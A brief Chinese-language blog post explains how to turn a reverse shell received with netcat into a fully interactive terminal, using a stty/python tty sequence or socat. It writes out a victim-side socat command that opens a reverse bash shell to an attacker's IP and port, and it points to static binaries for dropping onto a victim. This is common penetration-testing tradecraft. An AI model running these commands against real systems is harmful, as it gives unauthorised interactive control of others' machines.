---
title: 如何利用socat和nc得到Full Functional Shell
layout: post
---
> Anger is my meat. I sup on myself. And so shall starve with feeding. William Shakespeare  

<br>
什么是 **_Full Functional Shell_**，简单理解就是有命令补全，VI编辑器正常使用，输错的命令可以按CTRL+Z重置，一句话就是和自己电脑的terminal的效果差不多。  
<br>
用netcat当接收到victim的reverse shell时，没有上述的功能，如果要编辑文件只能用```echo cat <<EOF wget curl 等等``` 这样的间接的方法去编辑，并且不小心按下CTRL+Z时直接会终端本次连接。  

<br>
两种方法可以避免。  

* **用nc**  
1. python -c得到tty
2. ctrl +Z
3. echo $TERM(记住这个变量)
4. stty -a (记住rows和columns)
5. stty raw -echo
6. 输入fg (如果是mac和zsh就一起输入 stty raw -echo; fg)
7. 输入reset
8. export SHELL=bash 
9. export TERM=xterm256-color (第三步)
10. stty rows ** columns * (第四步的值)

* **利用socat** ```(如果victim没有socat可以直接下载对应编译好的程序)``` [Github](https://github.com/andrew-d/static-binaries)
1. attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
2. victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$attackerIP:4444  

